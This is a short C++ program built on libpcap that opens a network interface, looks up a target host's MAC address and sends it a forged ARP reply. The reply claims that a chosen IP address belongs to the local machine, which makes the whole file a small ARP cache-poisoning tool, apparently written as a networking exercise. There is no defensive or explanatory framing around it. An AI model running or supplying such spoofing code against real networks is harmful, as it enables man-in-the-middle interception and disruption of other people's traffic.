#include <cstring>
#include <iostream>
#include <pcap.h>
#include <net/if_arp.h>

#include "network/utils.h"
#include "network/ArpPacket.h"

#define MAX_BYTES 2048

using namespace network;
using namespace std;

int main(int argc, char *argv[]) {
    pcap *desc = nullptr;
    char errbuf[PCAP_ERRBUF_SIZE] = {};
    char *dev = argv[1];

    std::memset(errbuf, 0, PCAP_ERRBUF_SIZE);

    cout << "open device " << dev << endl;

    if ((desc = pcap_open_live(dev, MAX_BYTES, 0, 512, errbuf)) == nullptr) {
        cerr << "error: "  << errbuf << endl;
        return -1;
    }

    IpAddr sip = IpAddr(argv[2]);
    IpAddr tip = IpAddr(argv[3]);
    HwAddr sender_mac = get_dev_mac(dev);
    HwAddr target_mac = get_target_mac(desc, sender_mac, sip, tip);

    ArpPacket arp = ArpPacket(ARPOP_REPLY,
            sender_mac, sip,
            target_mac, tip);
    byte *packet = arp.to_bytes();

    if (pcap_sendpacket(desc, packet, ArpPacket::size) != 0) {
        cerr << "Error sending the packet : " << pcap_geterr(desc) << endl;
        return -1;
    }

    free(packet);
    pcap_close(desc);
    return 0;
}